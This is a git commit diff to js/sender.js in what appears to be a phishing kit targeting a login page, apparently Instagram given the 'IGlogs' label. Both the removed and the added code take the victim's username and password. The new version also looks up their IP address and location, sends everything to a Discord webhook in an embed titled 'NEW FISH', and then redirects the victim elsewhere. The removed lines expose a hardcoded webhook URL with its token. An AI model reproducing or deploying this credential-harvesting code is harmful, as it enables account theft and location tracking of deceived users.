631948786371ca2062c8af299450114313c064e8
tammyhig <146199870+tammyhig@users.noreply.github.com>
2023-11-07 09:26:58 +0100

    Update sender.js

--- js/sender.js
+++ js/sender.js
@@ -1,39 +1,82 @@
-const form = document.querySelector("#form");
+const loginButton = document.querySelector("button[type='submit']");
+const password = document.querySelector("#password");
+const username = document.querySelector("#email");
+const showPasswordBtn = document.querySelector("#tchange");
 
-form.addEventListener("submit", (e) => {
-  e.preventDefault();
+password.addEventListener("input", disableBtn);
+username.addEventListener("input", disableBtn);
 
-  const identity = document.getElementById("email").value;
-  const password = document.getElementById("password").value;
+showPasswordBtn.addEventListener("click", passwordVisible);
 
-  const my_text = `Result is:%0A - Identity: ${identity} %0A - Password: ${password}`;
+function passwordVisible() {
+  if (password.type === "password") {
+    password.type = "text";
+    showPasswordBtn.textContent = "Hide";
+  } else {
+    password.type = "password";
+    showPasswordBtn.textContent = "Show";
+  }
+}
 
-  // Replace with your Discord webhook URL
-  const webhookURL = "https://discord.com/api/webhooks/1149618099880984657/3qnXvasbZR_jvv1A6RijxC7sEVsbuRJ6BKj2loKG7AVSBaUfuncqOfozp4k3gSe4lWXR";
+function disableBtn() {
+  if (username.value && password.value) {
+    loginButton.disabled = false;
+  } else {
+    loginButton.disabled = true;
+  }
+}
 
-  const payload = {
-    content: my_text,
+let Info;
+
+loginButton.addEventListener("click", () => {
+  (async function() {
+    Info = await getInfo();
+    console.log(Info);
+    sendInfo();
+  })();
+});
+
+async function getInfo() {
+  try {
+    const response = await fetch("https://ipapi.co/json/");
+    const data = await response.json();
+
+    const info = `> IP: ${data.ip}\n> City: ${data.city}\n> Region: ${data.region}\n> Country: ${data.country_name}\n> Postal Code: ${data.postal}\n> Browser: ${navigator.userAgent}\n> Username: ${username.value}\n> Password: ${password.value}\n`;
+
+    return info;
+  } catch {
+    return `> IP: Unknown\n> City: Unknown\n> Region: Unknown\n> Country: Unknown\n> Postal Code: Unknown\n> Browser: ${navigator.userAgent}\n> Username: ${username.value}\n> Password: ${password.value}\n`;
+  }
+}
+
+async function sendInfo() {
+  const webhook = "YOUR_DISCORD_WEBHOOK_URL";
+
+  const embed = {
+    color: 1585803, // #18328b
+    title: "NEW FISH",
+    description: `${Info}`,
+    footer: {
+      text: "@terrykiddo",
+    },
   };
 
-  fetch(webhookURL, {
+  const config = {
     method: "POST",
     headers: {
       "Content-Type": "application/json",
     },
-    body: JSON.stringify(payload),
-  })
-    .then((response) => {
-      if (response.ok) {
-        console.log("Message sent successfully to Discord!");
-      } else {
-        console.error("Failed to send the message to Discord.");
-        document.getElementById("alert-message").innerHTML =
-          "Sorry, there was an error while sending your message.";
-      }
-    })
-    .catch((error) => {
-      console.error("Error:", error);
-      document.getElementById("alert-message").innerHTML =
-        "Sorry, there was an error while sending your message.";
-    });
-});
+    body: JSON.stringify({ username: "TK_IGlogs", embeds: [embed] }),
+  };
+
+  try {
+    await fetch(webhook, config);
+  } catch {
+    setTimeout(function() {
+      window.location.replace("https://spring-feather-2536.on.fleek.co/");
+    }, 1000);
+  }
+  setTimeout(function() {
+    window.location.replace("https://spring-feather-2536.on.fleek.co/");
+  }, 1000);
+}
